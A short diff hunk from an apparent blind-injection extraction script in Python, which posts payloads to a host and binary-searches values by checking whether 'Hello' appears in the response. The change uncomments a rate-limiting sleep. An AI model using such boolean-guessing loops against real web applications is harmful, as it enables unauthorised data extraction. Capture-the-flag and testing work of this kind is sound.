@@ -305,7 +305,7 @@ for i in range(1, 50):
         # print(payload["id"])
         se = rq.post(url=host, data=payload)
         # 请求发太快了容易出问题，所以这里的sleep是必须的
-        # time.sleep(0.1)
+        time.sleep(0.1)
         # 如果猜的数字更小
         if "Hello" in se.text:
             a = m + 1
